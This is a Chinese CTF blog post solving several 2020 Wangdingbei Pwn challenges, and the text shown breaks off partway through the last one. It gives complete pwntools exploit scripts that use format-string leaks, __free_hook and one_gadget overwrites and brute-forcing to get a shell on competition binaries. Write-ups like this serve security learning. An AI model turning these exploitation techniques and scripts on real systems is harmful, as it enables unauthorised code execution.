@@ -1,0 +1,926 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="网鼎杯,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
+   
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    2020网鼎杯部分Pwn题解 |  Kiprey&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+<script>
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-2020wdbctf"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  2020网鼎杯部分Pwn题解
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/05/2020wdbctf/" class="article-date">
+  <time datetime="2020-05-22T15:42:09.000Z" itemprop="datePublished">2020-05-22</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">3.3k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">13 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <blockquote>
+<p>此处将会收录笔者力所能及的题解。<br>
+超出笔者技术水平的题目（例如kernel exploit）以及笔者因各种因素无法接触的题（例如bind pwn）将不会被收录。</p>
+</blockquote>
+<h2 id="1-青龙组">1.青龙组</h2>
+<h3 id="1-boom1">1. boom1</h3>
+<p>点击<a href="/2020/05/2020wdbctf/boom1" title="这里">这里</a>下载文件</p>
+<h4 id="1-易知信息">1) 易知信息</h4>
+<ul>
+<li>保护全开</li>
+<li>ELF文件中rodata段上有大量字符串。将其中部分字符串百度一下（例如： <code>duplicate global definition</code>）便可得知，该程序为C语言解释器</li>
+<li>在程序main函数中，发现一串疑似可用的关键字/函数名。<br>
+<img src="/2020/05/2020wdbctf/boom1_KeyChars.png" alt="img"></li>
+</ul>
+<a id="more"></a>
+<ul>
+<li>IDA反编译后，在main函数后半段中，发现所有函数只能执行一次，没办法直接ORW flag<br>
+<img src="/2020/05/2020wdbctf/boom1_FuncOnce.png" alt="img"></li>
+</ul>
+<blockquote>
+<p>说了这么多，其实和解法一点关系也没有 T_T</p>
+</blockquote>
+<h4 id="2-分析">2) 分析</h4>
+<ol>
+<li>
+<p>我们需要先泄露出libc的版本来。 先在printf处下断点，然后计算__libc_start_main_ret的相对偏移量<br>
+然后用printf格式化字符串漏洞来泄露__libc_start_main_ret的地址。之后就可以查询libc-database，得到libc的版本</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 21个 "%p "</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>泄露__libc_start_main_ret地址（单击图片可放大）<br>
+<img src="/2020/05/2020wdbctf/boom1_LeakLibc_start_main_ret.png" alt="img"></li>
+<li>泄露远程libc版本<br>
+<img src="/2020/05/2020wdbctf/boom1_LeakLibcVersion.png" alt="img"></li>
+</ul>
+</li>
+<li>
+<p>在得到libc版本后，<strong>一定要先打patch!!!</strong>。当程序使用不同libc时，其内存布局也会不一样，会发生改变，所以一定要先打patch。</p>
+<blockquote>
+<p>一个可能的原因是，程序被装载时，其内存布局可能是由libc上关于ELF的代码所设置的。<br>
+不同libc的相关代码可能不一样</p>
+</blockquote>
+</li>
+<li>
+<p>因为 mmap 分配的内存与 libc 之前存在固定的偏移，因此可以推算出 libc 的基地址</p>
+<blockquote>
+<p>尚未查明原因。不过ASLR的实现可能也是基于mmap函数的分配机制</p>
+</blockquote>
+<p>先在程序退出处下断点，然后把本地变量地址输出。并在vmmap里找寻libc的基地址。两者相减便可得到相对偏移</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/2020wdbctf/boom1_Vmmap.png" alt="img"></p>
+</li>
+<li>
+<p>在得到了libc版本和基地址后，只要将libc中<code>__free_hook</code>改为<code>system</code>函数的起始地址，然后再<code>free(&quot;/bin/sh&quot;)</code>即可get shell.</p>
+<blockquote>
+<p><strong>注意！</strong></p>
+</blockquote>
+<blockquote>
+<ol>
+<li>变量a不可声明为char,原因是char类型变量只会修改一个字节，这无异于杯水车薪。</li>
+<li>下面的C语言exp中，变量a的类型为int, 则&amp;a是int* 的值，故&amp;a + 1 == (int)&amp;a + 8。<br>
+所以变量a与__free_hook的相对偏移需要除以sizeof(int)。<br>
+如果您仍然迷惑，请查阅C语言指针运算相关知识。</li>
+</ol>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> a;</span><br><span class="line">  *(&amp;a + (<span class="number">-1459952</span> / <span class="keyword">sizeof</span>(<span class="keyword">int</span>))) = (<span class="keyword">int</span>)&amp;a + (<span class="number">-5254040</span>);</span><br><span class="line">  <span class="built_in">free</span>(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="3-半自动EXP">3) 半自动EXP</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        io = remote(<span class="string">"node3.buuoj.cn"</span>, sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">'./boom1'</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(io, script=<span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(io, script)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakLibcVersion</span><span class="params">()</span>:</span></span><br><span class="line">    io = connect()</span><br><span class="line">    debug(io, <span class="string">"b * $rebase(0x4CDD)\nc"</span>)</span><br><span class="line">    code = <span class="string">'''</span></span><br><span class="line"><span class="string">        int main()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            printf("'''</span> + <span class="string">"%p "</span> * <span class="number">21</span> + <span class="string">'''");</span></span><br><span class="line"><span class="string">            return 0;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">    io.sendlineafter(<span class="string">"I'm living...\n"</span>, code.replace(<span class="string">'\n'</span>, <span class="string">''</span>))</span><br><span class="line">    log.info(io.recv())</span><br><span class="line">    <span class="comment"># 将得到的__libc_start_main_ret地址填入，得到libc版本</span></span><br><span class="line">    obj = LibcSearcher(<span class="string">'__libc_start_main_ret'</span>, <span class="number">0x7f2e710b8b97</span>)</span><br><span class="line">    obj.dump(<span class="string">"__libc_start_main_ret"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakOffset</span><span class="params">()</span>:</span></span><br><span class="line">    io = process(<span class="string">'./boom1'</span>)</span><br><span class="line">    code = <span class="string">'''</span></span><br><span class="line"><span class="string">        int main()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            int a;</span></span><br><span class="line"><span class="string">            printf("%p\\n", &amp;a);</span></span><br><span class="line"><span class="string">            return 0;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">    <span class="comment"># 下断点后vmmap查看libc基地址</span></span><br><span class="line">    debug(io, <span class="string">"b * $rebase(0x4e17)"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"I'm living..."</span>, code.replace(<span class="string">'\n'</span>, <span class="string">''</span>))</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getShell</span><span class="params">(libc, libc_offset)</span>:</span></span><br><span class="line">    io = connect()</span><br><span class="line">    free_hook_offset = libc_offset + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    system_offset = libc_offset + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">"free_hook addr: "</span> + hex(free_hook_offset ))</span><br><span class="line">    log.info(<span class="string">"system addr: "</span> + hex(system_offset))</span><br><span class="line"></span><br><span class="line">    code = <span class="string">'''</span></span><br><span class="line"><span class="string">        int main()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            int a;</span></span><br><span class="line"><span class="string">            *(&amp;a + (</span></span><br><span class="line"><span class="string">            '''</span> + str(free_hook_offset) + <span class="string">'''</span></span><br><span class="line"><span class="string">             / sizeof(int))) = (int)&amp;a + (</span></span><br><span class="line"><span class="string">            '''</span> + str(system_offset) + <span class="string">'''</span></span><br><span class="line"><span class="string">            );</span></span><br><span class="line"><span class="string">            free("/bin/sh");</span></span><br><span class="line"><span class="string">            return 0;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">    debug(io, <span class="string">"b * $rebase(0x4e17)\nb * $rebase(0x4C04)"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"I'm living..."</span>, code.replace(<span class="string">'\n'</span>, <span class="string">''</span>).replace(<span class="string">"  "</span>, <span class="string">""</span>))</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># 第一步，泄露libc版本，以及free和system函数相对libc基地址的偏移量</span></span><br><span class="line">    <span class="comment"># leakLibcVersion()</span></span><br><span class="line">    <span class="comment"># 泄露出libc 版本后，打上patch</span></span><br><span class="line">    libc = ELF(<span class="string">"/mylibs/2.27-3ubuntu1_amd64/libc-2.27.so"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二步，泄露VM的本地变量地址，并查找本地变量与libc基地址之间的相对偏移量</span></span><br><span class="line">    <span class="comment"># leakOffset()</span></span><br><span class="line">    <span class="comment"># 通过动态调试，确定与libc基地址的偏移量</span></span><br><span class="line">      <span class="comment"># libc base addr - local vals addr</span></span><br><span class="line">    libc_offset = <span class="number">0x7f8b1ae8f000</span> - <span class="number">0x7f8b1b3e0fd8</span></span><br><span class="line">    <span class="comment"># 第三步，修改free_hook为system的函数地址，然后free("/bin/sh")即可</span></span><br><span class="line">    getShell(libc, libc_offset)</span><br></pre></td></tr></table></figure>
+<h3 id="2-boom2">2. boom2</h3>
+<p>点击<a href="/2020/05/2020wdbctf/boom2" title="这里">这里</a>下载文件</p>
+<h4 id="1-易知信息-2">1) 易知信息</h4>
+<ul>
+<li>保护全开</li>
+<li>和boom1类似，这题是VMpwn</li>
+</ul>
+<h4 id="2-分析-2">2) 分析</h4>
+<ul>
+<li>
+<p>VMpwn有几个共性</p>
+<ol>
+<li><strong>大量分支</strong><br>
+话不多说，看图<br>
+<img src="/2020/05/2020wdbctf/boom2_idabranches.png" alt="img"></li>
+<li><code>3/4个寄存器</code>
+<ol>
+<li><code>IP</code>，用于指向下条指令的指针</li>
+<li><code>SP</code>，指向虚拟栈的栈顶</li>
+<li><code>AX</code>，用于存放运算结果的变量</li>
+<li><code>BP</code>（如果有的话），用于指向虚拟栈中某些位置，以便于运算时使用<br>
+<img src="/2020/05/2020wdbctf/boom2_vmFeature.png" alt="img"></li>
+</ol>
+</li>
+</ol>
+</li>
+<li>
+<p>该程序可执行 <strong>压栈</strong>、<strong>弹栈</strong>、<strong>+-*/%等运算</strong>、<strong>指针解引用</strong> 等，还支持对 <strong>指令立即数</strong> 的相关操作。</p>
+</li>
+<li>
+<p>动态调试发现，初始时虚拟栈上存有栈上<code>environ</code>的地址<br>
+<img src="/2020/05/2020wdbctf/boom2_vmStack.png" alt="img"></p>
+</li>
+<li>
+<p>所以我们可以通过修改虚拟栈上存放的<code>environ</code>地址，将其减去某个偏移，得到<code>__libc_start_main_ret</code>所在的栈地址。进而在<code>__libc_start_main_ret</code>的栈地址处写入one_gadget。待main函数返回时get shell.</p>
+<blockquote>
+<p>one_gadget的地址可通过对<code>__libc_start_main_ret</code>值的运算得到</p>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<p>这题的libc必须沿用上一题boom1的libc。这题没有回显，无法泄露远程libc版本，但又必须使用one_gadget</p>
+</blockquote>
+<ul>
+<li>剩下的分析将会在EXP里以注释的形式呈现，便于理解</li>
+</ul>
+<h4 id="3-EXP">3) EXP</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ELFname = <span class="string">"./boom2"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    io = remote(<span class="string">"node3.buuoj.cn"</span>, sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(ELFname)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(msg = <span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(io, msg)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 栈上 __libc_start_main_ret与 environ 的相对偏移</span></span><br><span class="line">stack_offset = <span class="number">0xE8</span></span><br><span class="line"><span class="comment"># libc中 one_gadget 与 __libc_start_main_ret 的相对偏移</span></span><br><span class="line">libc_offset = <span class="number">0x4f2c5</span> - <span class="number">0x021b97</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="comment"># pop一个值出来，使得$sp指针刚好指向environ地址所在的内存</span></span><br><span class="line">payload += flat(<span class="number">14</span>)</span><br><span class="line"><span class="comment"># 将栈偏移赋值到$ax</span></span><br><span class="line">payload += flat(<span class="number">1</span>, stack_offset)</span><br><span class="line"><span class="comment"># 弹出environ地址，将$ax的值与该栈地址相减，并将结果赋值到$ax上</span></span><br><span class="line">payload += flat(<span class="number">26</span>)</span><br><span class="line"><span class="comment"># 将$ax的值重新压入虚拟栈中</span></span><br><span class="line">payload += flat(<span class="number">13</span>)</span><br><span class="line"><span class="comment"># 解引用$ax，取出__libc_start_main_ret的libc地址，结果放置在$ax</span></span><br><span class="line">payload += flat(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># 将$ax的值重新压入虚拟栈中</span></span><br><span class="line">payload += flat(<span class="number">13</span>)</span><br><span class="line"><span class="comment"># 将libc偏移赋值到$ax</span></span><br><span class="line">payload += flat(<span class="number">1</span>, libc_offset)</span><br><span class="line"><span class="comment"># 弹出__libc_start_main_ret的libc地址，将$ax的值与该地址相加得到one_gadget地址，并将结果赋值到$ax上</span></span><br><span class="line">payload += flat(<span class="number">25</span>)</span><br><span class="line"><span class="comment"># 弹出__libc_start_main_ret的栈地址，并向该栈地址写入$ax(&amp;one_gadget)</span></span><br><span class="line">payload += flat(<span class="number">11</span>)</span><br><span class="line"><span class="comment"># 退出程序</span></span><br><span class="line">payload += flat(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">debug(<span class="string">"b * $rebase(0xA4A)"</span>)</span><br><span class="line">io.sendafter(<span class="string">"Input your code&gt; "</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="3-faster0">3. faster0</h3>
+<p>点击<a href="/2020/05/2020wdbctf/faster" title="这里">这里</a>下载文件</p>
+<h4 id="1-易知信息-3">1) 易知信息</h4>
+<ul>
+<li>由于赛后复盘时间较晚，无法连接远程，故初始的hash爆破的复盘只能搁置</li>
+<li>保护只开了partial RELRO和NX</li>
+<li>程序在read一串长字符串后，必须通过100个func函数，才能执行到一个最终带有栈溢出漏洞的函数func100</li>
+</ul>
+<h4 id="2-分析-3">2) 分析</h4>
+<ul>
+<li>这里第一时间就想到了爆破，最大爆破次数100 * 10 == 1000次。程序在本地执行的很快，不需要花太久时间<br>
+在本地试着爆破了一下，发现速度还挺快<br>
+<img src="/2020/05/2020wdbctf/faster_bruteForce.png" alt="img"></li>
+<li>爆破出路径后，程序就可以进行栈溢出了。在程序中有read有write，无论是泄露libc版本打patch还是直接DynELF都可以，就不再赘述了</li>
+</ul>
+<h4 id="3-爆破脚本">3) 爆破脚本</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line">times = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round</span><span class="params">(tmpPwd)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> times, password</span><br><span class="line">    times += <span class="number">1</span></span><br><span class="line">    result = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    io = process(<span class="string">'faster0'</span>)</span><br><span class="line">    log.info(<span class="string">"try passwd: "</span> + str(times) + <span class="string">": "</span> + tmpPwd)</span><br><span class="line">    io.send(tmpPwd)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.recv(timeout=<span class="number">0.3</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        result = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">startTime = time.time()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> val <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        ch = str(val)</span><br><span class="line">        <span class="keyword">if</span> round(password + ch):</span><br><span class="line">            password += ch</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">endTime = time.time()</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'-'</span>*<span class="number">120</span> + <span class="string">"\n"</span>*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'Password: '</span> + password)</span><br><span class="line">log.success(<span class="string">"RoundTimes: "</span> + str(times))</span><br><span class="line">log.success(<span class="string">"Time: "</span> + str(endTime - startTime))</span><br></pre></td></tr></table></figure>
+<h2 id="2-白虎组">2.白虎组</h2>
+<h3 id="1-of">1. of</h3>
+<p>点击<a href="/2020/05/2020wdbctf/of" title="这里">这里</a>下载文件</p>
+<ul>
+<li>一道非常非常基础的gets栈溢出</li>
+<li>EXP略</li>
+</ul>
+<h3 id="2-quantum-entanglement">2. quantum_entanglement</h3>
+<p>点击<a href="/2020/05/2020wdbctf/quantum_entanglement" title="这里">这里</a>下载文件</p>
+<h4 id="1-分析">1) 分析</h4>
+<ul>
+<li>
+<p>程序会生成两个随机数，并将这两个数放置在栈上。同时，程序还会将某个随机数的栈地址后2字节放置在栈上<br>
+<img src="/2020/05/2020wdbctf/quantum_entanglement_maincode.png" alt="img"><br>
+在执行<code>log_in</code>函数之后，判断栈上两个随机数是否相同，如果相同则get shell。</p>
+</li>
+<li>
+<p><code>log_in</code>函数存在格式化字符串漏洞<br>
+<img src="/2020/05/2020wdbctf/quantum_entanglement_printf.png" alt="img"></p>
+<blockquote>
+<p>这个漏洞函数有点坑，故意设置arg2为<code>%s</code>。 如果审计伪代码时速度稍微快了一点，说不定就审不出来了 :-)</p>
+</blockquote>
+</li>
+<li>
+<p>既然我们要通过格式化字符串漏洞来pass后面的随机数比较，那么我们就先看看栈上的数据<br>
+<img src="/2020/05/2020wdbctf/quantum_entanglement_stack1.png" alt="img"><br>
+我们希望将这半截地址写到栈上存储的某个栈地址上，从而在栈上构造随机数1的栈地址。之后便可以通过该地址来修改上面的随机数。</p>
+<blockquote>
+<p>一个小例子:</p>
+<ul>
+<li>假设rand1的栈地址为<code>0xFFFF1111</code>， 栈上已经存放了其半截地址 <code>0x1111</code></li>
+<li>在栈上找到一个地址<code>0xFFFF2222</code>，该地址上存放着一个栈地址<code>0xFFFF3333</code> ([<code>0xFFFF2222</code>] = <code>0xFFFF3333</code>)。同时地址<code>0xFFFF3333</code>上存放着另一个栈地址<code>0xFFFF4444</code>([<code>0xFFFF3333</code>] = <code>0xFFFF4444</code>)</li>
+<li>通过指针<code>0xFFFF2222</code>，向地址<code>0xFFFF333</code>写入两字节<code>0x1111</code>，使得[<code>0xFFFF333</code>] = <code>0xFFFF1111</code></li>
+<li>现在，栈上已经存放了指针<code>0xFFFF1111</code>。之后我们就可以通过格式化字符串漏洞修改地址<code>0xFFFF1111</code>上的值</li>
+</ul>
+</blockquote>
+</li>
+<li>
+<p>我们可以在栈的底部找到所需的<code>栈1-&gt;栈2-&gt;栈3</code>链<br>
+<img src="/2020/05/2020wdbctf/quantum_entanglement_stack2.png" alt="img"></p>
+</li>
+<li>
+<p><strong>关键点</strong>：利用格式化字符串 <code>%*A$c%B$hn</code> , 我们可以将argA上的两字节移动到argB指向的内存上</p>
+<blockquote>
+<p>argA、argB为printf的参数A、参数B。参数0为格式化字符串地址<br>
+<code>%*A$c</code> 的效果与 <code>%[argA]c</code> 相同。都是输出argA个字符。<br>
+例子：<code>%*12$c%22$hn</code> , 将printf参数12的两字节，写入到参数22指向的内存中</p>
+</blockquote>
+</li>
+<li>
+<p>在计算出相对偏移后，将随机数rand1的半截地址写入<code>栈1-&gt;栈2-&gt;栈3</code>指针链中的<code>栈2</code>，从而使<code>栈2</code>指向<code>rand1</code>。</p>
+<blockquote>
+<p><code>栈1</code>-&gt;<code>栈2</code>-&gt;<code>rand1</code></p>
+</blockquote>
